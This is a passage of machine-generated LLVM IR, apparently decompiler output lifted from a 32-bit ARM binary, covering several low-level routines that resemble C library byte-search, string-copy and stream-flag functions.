  %v1_13a4c = add i32 %v0_13a4c, 8
  %v2_13a4c = inttoptr i32 %v1_13a4c to i32*
  %v3_13a4c = load i32, i32* %v2_13a4c, align 4
  store i32 %v3_13a4c, i32* %r2.global-to-local, align 4
  %v2_13a50 = add i32 %v3_13a4c, %v4_13a48
  %v2_13a54 = add i32 %v0_13a4c, 20
  %v3_13a54 = inttoptr i32 %v2_13a54 to i32*
  store i32 %v2_13a50, i32* %v3_13a54, align 4
  %v0_13a58 = load i32, i32* %r2.global-to-local, align 4
  %v1_13a58 = load i32, i32* @r4, align 4
  %v2_13a58 = add i32 %v1_13a58, 16
  %v3_13a58 = inttoptr i32 %v2_13a58 to i32*
  store i32 %v0_13a58, i32* %v3_13a58, align 4
  %v2_13a5c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13a5c, i32* @r4, align 4
  ret i32 %v4_13a48

; uselistorder directives
  uselistorder i32 %v4_13a48, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
}

define i32 @function_13a60() local_unnamed_addr {
dec_label_pc_13a60:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_13a60 = load i32, i32* @r4, align 4
  store i32 %v3_13a60, i32* %stack_var_-12, align 4
  %v0_13a64 = load i32, i32* @r0, align 4
  %v1_13a64 = inttoptr i32 %v0_13a64 to i8*
  %v2_13a64 = load i8, i8* %v1_13a64, align 1
  %v3_13a64 = zext i8 %v2_13a64 to i32
  store i32 %v3_13a64, i32* %r2.global-to-local, align 4
  %v1_13a68 = add i32 %v0_13a64, 1
  %v2_13a68 = inttoptr i32 %v1_13a68 to i8*
  %v3_13a68 = load i8, i8* %v2_13a68, align 1
  %v4_13a68 = zext i8 %v3_13a68 to i32
  store i32 %v4_13a68, i32* %r3.global-to-local, align 4
  %v4_13a6c = mul nuw nsw i32 %v4_13a68, 256
  %v5_13a6c = or i32 %v4_13a6c, %v3_13a64
  store i32 %v5_13a6c, i32* %r2.global-to-local, align 4
  %v1_13a70 = load i32, i32* @r1, align 4
  %v2_13a70 = and i32 %v1_13a70, %v5_13a6c
  %v4_13a70 = icmp eq i32 %v2_13a70, 0
  store i32 %v0_13a64, i32* @r4, align 4
  br i1 %v4_13a70, label %dec_label_pc_13a7c, label %dec_label_pc_13a94

dec_label_pc_13a7c:                               ; preds = %dec_label_pc_13a60
  %v1_13a7c = and i32 %v5_13a6c, 2176
  %v2_13a7c = icmp eq i32 %v1_13a7c, 0
  br i1 %v2_13a7c, label %dec_label_pc_13a84, label %dec_label_pc_13aa8

dec_label_pc_13a84:                               ; preds = %dec_label_pc_13a7c
  %v2_13a84 = or i32 %v1_13a70, %v5_13a6c
  store i32 %v2_13a84, i32* %r2.global-to-local, align 4
  %v3_13a88 = sdiv i32 %v2_13a84, 256
  store i32 %v3_13a88, i32* %r3.global-to-local, align 4
  %v1_13a8c = trunc i32 %v3_13a88 to i8
  store i8 %v1_13a8c, i8* %v2_13a68, align 1
  %v0_13a90 = load i32, i32* %r2.global-to-local, align 4
  %v1_13a90 = trunc i32 %v0_13a90 to i8
  %v2_13a90 = load i32, i32* @r0, align 4
  %v3_13a90 = inttoptr i32 %v2_13a90 to i8*
  store i8 %v1_13a90, i8* %v3_13a90, align 1
  %v0_13a94.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_13a94

dec_label_pc_13a94:                               ; preds = %dec_label_pc_13a60, %dec_label_pc_13a84
  %v0_13a94 = phi i32 [ %v0_13a64, %dec_label_pc_13a60 ], [ %v0_13a94.pre, %dec_label_pc_13a84 ]
  %v1_13a94 = inttoptr i32 %v0_13a94 to i8*
  %v2_13a94 = load i8, i8* %v1_13a94, align 1
  %v3_13a94 = zext i8 %v2_13a94 to i32
  store i32 %v3_13a94, i32* %r2.global-to-local, align 4
  %v1_13a98 = add i32 %v0_13a94, 1
  %v2_13a98 = inttoptr i32 %v1_13a98 to i8*
  %v3_13a98 = load i8, i8* %v2_13a98, align 1
  %v4_13a98 = zext i8 %v3_13a98 to i32
  %v4_13a9c = mul nuw nsw i32 %v4_13a98, 256
  %v5_13a9c = or i32 %v4_13a9c, %v3_13a94
  store i32 %v5_13a9c, i32* %r3.global-to-local, align 4
  %v1_13aa0 = and i32 %v3_13a94, 16
  store i32 %v1_13aa0, i32* %r5.global-to-local, align 4
  %v2_13aa0 = icmp eq i32 %v1_13aa0, 0
  br i1 %v2_13aa0, label %dec_label_pc_13ad0, label %dec_label_pc_13aa8

dec_label_pc_13aa8:                               ; preds = %dec_label_pc_13a7c, %dec_label_pc_13a94
  %v0_13aa8 = call i32 @function_cec4()
  store i32 9, i32* %r3.global-to-local, align 4
  %v2_13ab0 = inttoptr i32 %v0_13aa8 to i32*
  store i32 9, i32* %v2_13ab0, align 4
  br label %dec_label_pc_13ab4

dec_label_pc_13ab4:                               ; preds = %dec_label_pc_13ad8, %dec_label_pc_13aa8
  %v0_13ab4 = load i32, i32* @r4, align 4
  %v1_13ab4 = inttoptr i32 %v0_13ab4 to i32*
  %v2_13ab4 = load i32, i32* %v1_13ab4, align 4
  %v1_13ab8 = or i32 %v2_13ab4, 8
  store i32 %v1_13ab8, i32* %r3.global-to-local, align 4
  %v3_13abc = sdiv i32 %v2_13ab4, 256
  store i32 %v3_13abc, i32* %r2.global-to-local, align 4
  %v1_13ac4 = trunc i32 %v3_13abc to i8
  %v3_13ac4 = add i32 %v0_13ab4, 1
  %v4_13ac4 = inttoptr i32 %v3_13ac4 to i8*
  store i8 %v1_13ac4, i8* %v4_13ac4, align 1
  %v0_13ac8 = load i32, i32* %r3.global-to-local, align 4
  %v1_13ac8 = trunc i32 %v0_13ac8 to i8
  %v2_13ac8 = load i32, i32* @r4, align 4
  %v3_13ac8 = inttoptr i32 %v2_13ac8 to i8*
  store i8 %v1_13ac8, i8* %v3_13ac8, align 1
  %v2_13acc = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_13acc, i32* @r4, align 4
  ret i32 -1

dec_label_pc_13ad0:                               ; preds = %dec_label_pc_13a94
  %v1_13ad0 = and i32 %v3_13a94, 64
  %v2_13ad0 = icmp eq i32 %v1_13ad0, 0
  br i1 %v2_13ad0, label %dec_label_pc_13b00, label %dec_label_pc_13ad8

dec_label_pc_13ad8:                               ; preds = %dec_label_pc_13ad0
  %v0_13ad8 = call i32 @function_d8c8()
  %v2_13adc = icmp eq i32 %v0_13ad8, 0
  br i1 %v2_13adc, label %dec_label_pc_13ae4, label %dec_label_pc_13ab4

dec_label_pc_13ae4:                               ; preds = %dec_label_pc_13ad8
  %v0_13ae4 = load i32, i32* @r4, align 4
  %v1_13ae4 = inttoptr i32 %v0_13ae4 to i32*
  %v2_13ae4 = load i32, i32* %v1_13ae4, align 4
  store i32 %v2_13ae4, i32* %r3.global-to-local, align 4
  %v1_13ae8 = add i32 %v0_13ae4, 8
  %v2_13ae8 = inttoptr i32 %v1_13ae8 to i32*
  %v3_13ae8 = load i32, i32* %v2_13ae8, align 4
  store i32 %v3_13ae8, i32* %r2.global-to-local, align 4
  %v1_13aec = and i32 %v2_13ae4, -65
  store i32 %v1_13aec, i32* %r3.global-to-local, align 4
  %v3_13af0 = sdiv i32 %v2_13ae4, 256
  store i32 %v3_13af0, i32* %r1.global-to-local, align 4
  %v2_13af4 = add i32 %v0_13ae4, 28
  %v3_13af4 = inttoptr i32 %v2_13af4 to i32*
  store i32 %v3_13ae8, i32* %v3_13af4, align 4
  %v0_13af8 = load i32, i32* %r1.global-to-local, align 4
  %v1_13af8 = trunc i32 %v0_13af8 to i8
  %v2_13af8 = load i32, i32* @r4, align 4
  %v3_13af8 = add i32 %v2_13af8, 1
  %v4_13af8 = inttoptr i32 %v3_13af8 to i8*
  store i8 %v1_13af8, i8* %v4_13af8, align 1
  %v0_13afc = load i32, i32* %r3.global-to-local, align 4
  %v1_13afc = trunc i32 %v0_13afc to i8
  %v2_13afc = load i32, i32* @r4, align 4
  %v3_13afc = inttoptr i32 %v2_13afc to i8*
  store i8 %v1_13afc, i8* %v3_13afc, align 1
  %v0_13b00.pre = load i32, i32* @r4, align 4
  %v0_13b0c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_13b00

dec_label_pc_13b00:                               ; preds = %dec_label_pc_13ad0, %dec_label_pc_13ae4
  %v0_13b0c = phi i32 [ 0, %dec_label_pc_13ad0 ], [ %v0_13b0c.pre, %dec_label_pc_13ae4 ]
  %v2_13b10 = phi i32 [ %v0_13a94, %dec_label_pc_13ad0 ], [ %v0_13b00.pre, %dec_label_pc_13ae4 ]
  %v1_13b00 = inttoptr i32 %v2_13b10 to i32*
  %v2_13b00 = load i32, i32* %v1_13b00, align 4
  %v1_13b04 = or i32 %v2_13b00, 1
  store i32 %v1_13b04, i32* %r3.global-to-local, align 4
  %v3_13b08 = sdiv i32 %v2_13b00, 256
  store i32 %v3_13b08, i32* %r2.global-to-local, align 4
  %v1_13b10 = trunc i32 %v3_13b08 to i8
  %v3_13b10 = add i32 %v2_13b10, 1
  %v4_13b10 = inttoptr i32 %v3_13b10 to i8*
  store i8 %v1_13b10, i8* %v4_13b10, align 1
  %v0_13b14 = load i32, i32* %r3.global-to-local, align 4
  %v1_13b14 = trunc i32 %v0_13b14 to i8
  %v2_13b14 = load i32, i32* @r4, align 4
  %v3_13b14 = inttoptr i32 %v2_13b14 to i8*
  store i8 %v1_13b14, i8* %v3_13b14, align 1
  %v2_13b18 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_13b18, i32* @r4, align 4
  ret i32 %v0_13b0c

; uselistorder directives
  uselistorder i32 %v3_13b08, { 1, 0 }
  uselistorder i32 %v3_13abc, { 1, 0 }
  uselistorder i32 %v3_13a94, { 1, 2, 0, 3 }
  uselistorder i32 %v0_13a94, { 0, 2, 1 }
  uselistorder i32 %v3_13a88, { 1, 0 }
  uselistorder i32 %v5_13a6c, { 0, 2, 1, 3 }
  uselistorder i32 ()* @function_d8c8, { 2, 5, 4, 3, 7, 6, 1, 0 }
  uselistorder i32 2176, { 1, 0 }
  uselistorder label %dec_label_pc_13b00, { 1, 0 }
  uselistorder label %dec_label_pc_13aa8, { 1, 0 }
  uselistorder label %dec_label_pc_13a94, { 1, 0 }
}

define i32 @function_13b1c(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_13b1c:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg3, i32* %r3.global-to-local, align 4
  %v3_13b20 = load i32, i32* @r4, align 4
  %v6_13b20 = load i32, i32* @lr, align 4
  %v1_13b24 = add i32 %arg1, 4
  %v2_13b24 = inttoptr i32 %v1_13b24 to i32*
  %v3_13b24 = load i32, i32* %v2_13b24, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_13b2c = load i32, i32* %arg2, align 4
  %v3_13b2c = add i32 %tmp, 4
  %v4_13b2c = inttoptr i32 %v3_13b2c to i32*
  %v5_13b2c = load i32, i32* %v4_13b2c, align 4
  %v6_13b30 = call i32 @function_14a04(i32 %v3_13b24, i32 %v2_13b2c, i32 %v5_13b2c, i32 %arg3, i32 %v3_13b20, i32 %v6_13b20)
  %v1_13b34 = icmp slt i32 %v2_13b2c, 0
  %v6_13b30. = select i1 %v1_13b34, i32 %v6_13b30, i32 0
  store i32 %v6_13b30., i32* %r3.global-to-local, align 4
  br i1 %v1_13b34, label %bb5, label %bb

bb:                                               ; preds = %dec_label_pc_13b1c
  %v3_13b40 = load i32, i32* @r4, align 4
  %v4_13b40 = inttoptr i32 %v3_13b40 to i32*
  store i32 %v6_13b30, i32* %v4_13b40, align 4
  %v6_13b40 = add i32 %v3_13b40, 4
  %v7_13b40 = inttoptr i32 %v6_13b40 to i32*
  store i32 %v2_13b2c, i32* %v7_13b40, align 4
  %v0_13b44.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %dec_label_pc_13b1c, %bb
  %v0_13b44 = phi i32 [ %v6_13b30, %dec_label_pc_13b1c ], [ %v0_13b44.pre, %bb ]
  ret i32 %v0_13b44

; uselistorder directives
  uselistorder i32 %v6_13b30, { 0, 2, 1 }
  uselistorder i32 %v2_13b2c, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @function_13b4c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13b70:
  %v1_13b50 = urem i32 %arg1, 256
  store i32 %v1_13b50, i32* @lr, align 4
  %v4_13b70 = mul nuw nsw i32 %v1_13b50, 256
  %v5_13b70 = or i32 %v4_13b70, %v1_13b50
  %v4_13b78 = mul i32 %v5_13b70, 65536
  %v5_13b78 = or i32 %v4_13b78, %v5_13b70
  %v0_13b7c.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_13b7c

dec_label_pc_13b7c:                               ; preds = %dec_label_pc_13be8, %dec_label_pc_13b7c, %dec_label_pc_13b70
  %v0_13b7c = phi i32 [ %v0_13b7c.pre, %dec_label_pc_13b70 ], [ %v4_13b7c, %dec_label_pc_13b7c ], [ %v4_13b7c, %dec_label_pc_13be8 ]
  %v1_13b7c = inttoptr i32 %v0_13b7c to i32*
  %v2_13b7c = load i32, i32* %v1_13b7c, align 4
  %v4_13b7c = add i32 %v0_13b7c, 4
  store i32 %v4_13b7c, i32* @ip, align 4
  %v2_13b84 = xor i32 %v2_13b7c, %v5_13b78
  %v2_13b88 = add i32 %v2_13b84, 2130640639
  %v1_13b90 = sub i32 -1, %v2_13b84
  %v2_13b94 = xor i32 %v2_13b88, %v1_13b90
  %v2_13b98 = and i32 %v2_13b94, -2130640640
  %v2_13b9c = icmp eq i32 %v2_13b98, 0
  br i1 %v2_13b9c, label %dec_label_pc_13b7c, label %dec_label_pc_13ba4

dec_label_pc_13ba4:                               ; preds = %dec_label_pc_13b7c
  %v2_13ba4 = inttoptr i32 %v0_13b7c to i8*
  %v3_13ba4 = load i8, i8* %v2_13ba4, align 1
  %v4_13ba4 = zext i8 %v3_13ba4 to i32
  %v9_13bac = icmp eq i32 %v4_13ba4, %v1_13b50
  store i1 %v9_13bac, i1* @cpsr_z, align 1
  %v1_13bb0 = add i32 %v0_13b7c, 3
  %v1_13bb4 = add i32 %v0_13b7c, 1
  %v1_13bb8 = add i32 %v0_13b7c, 2
  br i1 %v9_13bac, label %bb, label %bb18

bb:                                               ; preds = %dec_label_pc_13ba4
  ret i32 %v0_13b7c

bb18:                                             ; preds = %dec_label_pc_13ba4
  %v2_13bc0 = inttoptr i32 %v1_13bb4 to i8*
  %v3_13bc0 = load i8, i8* %v2_13bc0, align 1
  %v4_13bc0 = zext i8 %v3_13bc0 to i32
  %v9_13bc4 = icmp eq i32 %v4_13bc0, %v1_13b50
  store i1 %v9_13bc4, i1* @cpsr_z, align 1
  br i1 %v9_13bc4, label %dec_label_pc_13bcc, label %dec_label_pc_13bd4

dec_label_pc_13bcc:                               ; preds = %bb18
  ret i32 %v1_13bb4

dec_label_pc_13bd4:                               ; preds = %bb18
  %v2_13bd4 = inttoptr i32 %v1_13bb8 to i8*
  %v3_13bd4 = load i8, i8* %v2_13bd4, align 1
  %v4_13bd4 = zext i8 %v3_13bd4 to i32
  %v9_13bd8 = icmp eq i32 %v4_13bd4, %v1_13b50
  store i1 %v9_13bd8, i1* @cpsr_z, align 1
  br i1 %v9_13bd8, label %dec_label_pc_13be0, label %dec_label_pc_13be8

dec_label_pc_13be0:                               ; preds = %dec_label_pc_13bd4
  ret i32 %v1_13bb8

dec_label_pc_13be8:                               ; preds = %dec_label_pc_13bd4
  %v2_13be8 = inttoptr i32 %v1_13bb0 to i8*
  %v3_13be8 = load i8, i8* %v2_13be8, align 1
  %v4_13be8 = zext i8 %v3_13be8 to i32
  %v9_13bec = icmp eq i32 %v4_13be8, %v1_13b50
  store i1 %v9_13bec, i1* @cpsr_z, align 1
  br i1 %v9_13bec, label %dec_label_pc_13bf4, label %dec_label_pc_13b7c

dec_label_pc_13bf4:                               ; preds = %dec_label_pc_13be8
  ret i32 %v1_13bb0

; uselistorder directives
  uselistorder i32 %v4_13b7c, { 2, 1, 0 }
  uselistorder i32 %v0_13b7c, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_13b70, { 1, 0 }
  uselistorder i32 %v1_13b50, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i1* @cpsr_z, { 7, 8, 9, 10, 1, 11, 12, 14, 15, 16, 17, 18, 19, 20, 2, 21, 22, 0, 3, 4, 5, 6, 13 }
}

define i32 @function_13c04(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_13c04:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13c04 = load i32, i32* @r4, align 4
  store i32 %v3_13c04, i32* %stack_var_-8, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13c10

dec_label_pc_13c10:                               ; preds = %dec_label_pc_13c10, %dec_label_pc_13c04
  %v0_13c10 = phi i32 [ %v5_13c10, %dec_label_pc_13c10 ], [ %tmp, %dec_label_pc_13c04 ]
  %v1_13c10 = inttoptr i32 %v0_13c10 to i8*
  %v2_13c10 = load i8, i8* %v1_13c10, align 1
  %v3_13c10 = zext i8 %v2_13c10 to i32
  store i32 %v3_13c10, i32* %ip.global-to-local, align 4
  %v5_13c10 = add i32 %v0_13c10, 1
  store i32 %v5_13c10, i32* %r3.global-to-local, align 4
  %v2_13c14 = icmp eq i8 %v2_13c10, 0
  store i1 %v2_13c14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13c14, label %dec_label_pc_13c1c, label %dec_label_pc_13c10

dec_label_pc_13c1c:                               ; preds = %dec_label_pc_13c10
  %v0_13c1c = load i32, i32* %r2.global-to-local, align 4
  %v7_13c1c = icmp eq i32 %v0_13c1c, 3
  store i1 %v7_13c1c, i1* %cpsr_z.global-to-local, align 1
  %v1_13c20 = add i32 %v0_13c10, -1
  store i32 %v1_13c20, i32* %lr.global-to-local, align 4
  %tmp10 = icmp ult i32 %v0_13c1c, 4
  br i1 %tmp10, label %dec_label_pc_13cb4thread-pre-split, label %dec_label_pc_13c28

dec_label_pc_13c28:                               ; preds = %dec_label_pc_13c1c
  %v3_13c28 = udiv i32 %v0_13c1c, 4
  store i32 %v3_13c28, i32* %r0.global-to-local, align 4
  %v0_13c2c.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_13c2c

dec_label_pc_13c2c:                               ; preds = %dec_label_pc_13c8c, %dec_label_pc_13c28
  %v2_13c34 = phi i32 [ %v1_13c84, %dec_label_pc_13c8c ], [ %v1_13c20, %dec_label_pc_13c28 ]
  %v0_13c2c = phi i32 [ %v1_13c80, %dec_label_pc_13c8c ], [ %v0_13c2c.pre, %dec_label_pc_13c28 ]
  %v1_13c2c = inttoptr i32 %v0_13c2c to i8*
  %v2_13c2c = load i8, i8* %v1_13c2c, align 1
  %v3_13c2c = zext i8 %v2_13c2c to i32
  store i32 %v3_13c2c, i32* %r3.global-to-local, align 4
  %v2_13c30 = icmp eq i8 %v2_13c2c, 0
  store i1 %v2_13c30, i1* %cpsr_z.global-to-local, align 1
  %v3_13c34 = add i32 %v2_13c34, 1
  %v4_13c34 = inttoptr i32 %v3_13c34 to i8*
  store i8 %v2_13c2c, i8* %v4_13c34, align 1
  %v0_13c38 = load i32, i32* %lr.global-to-local, align 4
  %v1_13c38 = add i32 %v0_13c38, 1
  store i32 %v1_13c38, i32* %ip.global-to-local, align 4
  %v0_13c3c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13c3c, label %.loopexit, label %dec_label_pc_13c40

dec_label_pc_13c40:                               ; preds = %dec_label_pc_13c2c
  %v0_13c40 = load i32, i32* @r1, align 4
  %v1_13c40 = add i32 %v0_13c40, 1
  %v2_13c40 = inttoptr i32 %v1_13c40 to i8*
  %v3_13c40 = load i8, i8* %v2_13c40, align 1
  %v4_13c40 = zext i8 %v3_13c40 to i32
  store i32 %v4_13c40, i32* %r3.global-to-local, align 4
  %v2_13c44 = icmp eq i8 %v3_13c40, 0
  store i1 %v2_13c44, i1* %cpsr_z.global-to-local, align 1
  %v3_13c48 = add i32 %v0_13c38, 2
  %v4_13c48 = inttoptr i32 %v3_13c48 to i8*
  store i8 %v3_13c40, i8* %v4_13c48, align 1
  %v0_13c4c = load i32, i32* @r1, align 4
  %v1_13c4c = add i32 %v0_13c4c, 1
  store i32 %v1_13c4c, i32* %r1.global-to-local, align 4
  %v0_13c50 = load i32, i32* %ip.global-to-local, align 4
  %v1_13c50 = add i32 %v0_13c50, 1
  store i32 %v1_13c50, i32* %ip.global-to-local, align 4
  %v0_13c54 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13c54, label %.loopexit, label %dec_label_pc_13c58

dec_label_pc_13c58:                               ; preds = %dec_label_pc_13c40
  %v1_13c58 = add i32 %v0_13c4c, 2
  %v2_13c58 = inttoptr i32 %v1_13c58 to i8*
  %v3_13c58 = load i8, i8* %v2_13c58, align 1
  %v4_13c58 = zext i8 %v3_13c58 to i32
  store i32 %v4_13c58, i32* %r3.global-to-local, align 4
  %v2_13c5c = icmp eq i8 %v3_13c58, 0
  store i1 %v2_13c5c, i1* %cpsr_z.global-to-local, align 1
  %v3_13c60 = add i32 %v0_13c50, 2
  %v4_13c60 = inttoptr i32 %v3_13c60 to i8*
  store i8 %v3_13c58, i8* %v4_13c60, align 1
  %v0_13c64 = load i32, i32* %r1.global-to-local, align 4
  %v1_13c64 = add i32 %v0_13c64, 1
  store i32 %v1_13c64, i32* %r1.global-to-local, align 4
  %v0_13c68 = load i32, i32* %ip.global-to-local, align 4
  %v1_13c68 = add i32 %v0_13c68, 1
  store i32 %v1_13c68, i32* %lr.global-to-local, align 4
  %v0_13c6c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13c6c, label %.loopexit, label %dec_label_pc_13c70

dec_label_pc_13c70:                               ; preds = %dec_label_pc_13c58
  %v1_13c70 = add i32 %v0_13c64, 2
  %v2_13c70 = inttoptr i32 %v1_13c70 to i8*
  %v3_13c70 = load i8, i8* %v2_13c70, align 1
  %v4_13c70 = zext i8 %v3_13c70 to i32
  store i32 %v4_13c70, i32* %ip.global-to-local, align 4
  store i32 %v1_13c70, i32* %r3.global-to-local, align 4
  %v2_13c78 = icmp eq i8 %v3_13c70, 0
  store i1 %v2_13c78, i1* %cpsr_z.global-to-local, align 1
  %v3_13c7c = add i32 %v0_13c68, 2
  %v4_13c7c = inttoptr i32 %v3_13c7c to i8*
  store i8 %v3_13c70, i8* %v4_13c7c, align 1
  %v0_13c80 = load i32, i32* %r3.global-to-local, align 4
  %v1_13c80 = add i32 %v0_13c80, 1
  store i32 %v1_13c80, i32* @r1, align 4
  %v0_13c84 = load i32, i32* %lr.global-to-local, align 4
  %v1_13c84 = add i32 %v0_13c84, 1
  store i32 %v1_13c84, i32* %lr.global-to-local, align 4
  %v0_13c88 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13c88, label %.loopexit, label %dec_label_pc_13c8c

dec_label_pc_13c8c:                               ; preds = %dec_label_pc_13c70
  %v0_13c8c = load i32, i32* %r0.global-to-local, align 4
  %v1_13c8c = add i32 %v0_13c8c, -1
  store i32 %v1_13c8c, i32* %r0.global-to-local, align 4
  %v7_13c8c = icmp eq i32 %v0_13c8c, 1
  store i1 %v7_13c8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13c8c, label %dec_label_pc_13c94, label %dec_label_pc_13c2c

dec_label_pc_13c94:                               ; preds = %dec_label_pc_13c8c
  %v0_13c94 = load i32, i32* %r2.global-to-local, align 4
  %v1_13c94 = urem i32 %v0_13c94, 4
  store i32 %v1_13c94, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13cb4

dec_label_pc_13c9c:                               ; preds = %dec_label_pc_13cb4
  %v0_13c9c = load i32, i32* @r1, align 4
  %v1_13c9c = inttoptr i32 %v0_13c9c to i8*
  %v2_13c9c = load i8, i8* %v1_13c9c, align 1
  %v3_13c9c = zext i8 %v2_13c9c to i32
  store i32 %v3_13c9c, i32* %ip.global-to-local, align 4
  %v2_13ca0 = icmp eq i8 %v2_13c9c, 0
  store i1 %v2_13ca0, i1* %cpsr_z.global-to-local, align 1
  %v1_13ca4 = add i32 %v1_13cc0, -1
  store i32 %v1_13ca4, i32* %r2.global-to-local, align 4
  %v3_13ca8 = add i32 %v3_13cc0, 1
  %v4_13ca8 = inttoptr i32 %v3_13ca8 to i8*
  store i8 %v2_13c9c, i8* %v4_13ca8, align 1
  %v5_13ca8 = load i32, i32* %lr.global-to-local, align 4
  %v6_13ca8 = add i32 %v5_13ca8, 1
  store i32 %v6_13ca8, i32* %lr.global-to-local, align 4
  %v0_13cac = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13cac, label %.loopexit, label %dec_label_pc_13cb0

dec_label_pc_13cb0:                               ; preds = %dec_label_pc_13c9c
  %v0_13cb0 = load i32, i32* @r1, align 4
  %v1_13cb0 = add i32 %v0_13cb0, 1
  store i32 %v1_13cb0, i32* @r1, align 4
  %v0_13cb4.pr.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13cb4thread-pre-split

dec_label_pc_13cb4thread-pre-split:               ; preds = %dec_label_pc_13cb0, %dec_label_pc_13c1c
  %v2_13ca86 = phi i32 [ %v6_13ca8, %dec_label_pc_13cb0 ], [ %v1_13c20, %dec_label_pc_13c1c ]
  %v0_13cb4.pr = phi i32 [ %v0_13cb4.pr.pre, %dec_label_pc_13cb0 ], [ %v0_13c1c, %dec_label_pc_13c1c ]
  br label %dec_label_pc_13cb4

dec_label_pc_13cb4:                               ; preds = %dec_label_pc_13cb4thread-pre-split, %dec_label_pc_13c94
  %v3_13cc0 = phi i32 [ %v2_13ca86, %dec_label_pc_13cb4thread-pre-split ], [ %v1_13c84, %dec_label_pc_13c94 ]
  %v1_13cc0 = phi i32 [ %v0_13cb4.pr, %dec_label_pc_13cb4thread-pre-split ], [ %v1_13c94, %dec_label_pc_13c94 ]
  %v2_13cb4 = icmp eq i32 %v1_13cc0, 0
  store i1 %v2_13cb4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13cb4, label %dec_label_pc_13cbc, label %dec_label_pc_13c9c

dec_label_pc_13cbc:                               ; preds = %dec_label_pc_13cb4
  %v0_13cbc = load i32, i32* %ip.global-to-local, align 4
  %v2_13cbc = icmp eq i32 %v0_13cbc, 0
  store i1 %v2_13cbc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13cbc, label %.loopexit, label %bb

bb:                                               ; preds = %dec_label_pc_13cbc
  %v4_13cc0 = add i32 %v3_13cc0, 1
  %v5_13cc0 = inttoptr i32 %v4_13cc0 to i8*
  store i8 0, i8* %v5_13cc0, align 1
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_13c70, %dec_label_pc_13c58, %dec_label_pc_13c40, %dec_label_pc_13c2c, %dec_label_pc_13c9c, %dec_label_pc_13cbc, %bb
  %v0_13cc4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_13cc4, i32* %r0.global-to-local, align 4
  %v2_13cc8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13cc8, i32* @r4, align 4
  ret i32 %v0_13cc4

; uselistorder directives
  uselistorder i32 %v1_13cc0, { 1, 0 }
  uselistorder i32 %v1_13c94, { 1, 0 }
  uselistorder i32 %v0_13c8c, { 1, 0 }
  uselistorder i32 %v1_13c84, { 0, 2, 1 }
  uselistorder i32 %v1_13c80, { 1, 0 }
  uselistorder i32 %v0_13c1c, { 2, 1, 0, 3 }
  uselistorder i32 %v5_13c10, { 1, 0 }
  uselistorder i32 %v0_13c10, { 0, 2, 1 }
  uselistorder i32 %tmp, { 0, 2, 1, 3 }
  uselistorder i32* %r2.global-to-local, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %lr.global-to-local, { 0, 4, 1, 2, 3, 5, 6 }
  uselistorder i32* %ip.global-to-local, { 6, 0, 1, 2, 3, 4, 5, 7 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 3, 1, 2, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder label %.loopexit, { 6, 5, 4, 0, 1, 2, 3 }
}

define i32 @function_13ccc(i8* %arg1) local_unnamed_addr {
dec_label_pc_13ccc:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 0, i32* @lr, align 4
  %v0_13d042 = load i32, i32* @r0, align 4
  %v1_13d043 = inttoptr i32 %v0_13d042 to i8*
  %v2_13d044 = load i8, i8* %v1_13d043, align 1
  %v2_13d086 = icmp eq i8 %v2_13d044, 0
  br i1 %v2_13d086, label %dec_label_pc_13d14, label %dec_label_pc_13ce0.preheader

dec_label_pc_13cd8:                               ; preds = %dec_label_pc_13ce0
  %v1_13ce8 = add i32 %v0_13ce8, 1
